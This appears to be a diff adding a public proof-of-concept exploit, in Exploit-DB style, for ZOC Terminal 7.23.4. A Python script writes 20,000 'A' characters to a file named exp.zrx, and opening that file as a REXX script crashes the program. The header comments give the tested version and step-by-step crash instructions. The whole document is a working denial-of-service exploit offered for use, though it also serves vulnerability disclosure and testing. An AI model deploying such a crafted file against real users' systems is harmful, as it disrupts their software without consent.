@@ -1,0 +1,20 @@
+#Exploit Title:  ZOC Terminal v7.23.4  - 'Script' Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-05-15
+#Vendor Homepage: https://www.emtec.com
+#Software Link: http://www.emtec.com/downloads/zoc/zoc7234_x64.exe
+#Tested Version: 7.23.4
+#Tested on: Windows 7 Service Pack 1 x64
+
+#Steps to produce the crash:
+#1.- Run python code: ZOC_Terminal_scr.py and it will create a new file "exp.zrx"
+#2.- Open ZOC Terminal
+#3.- Select Script > Start REXX Script... 
+#4.- Select "exp.zrx" file and click "open"
+#5.- Crashed
+
+cod = "\x41" * 20000
+
+f = open('exp.zrx', 'w')
+f.write(cod)
+f.close()
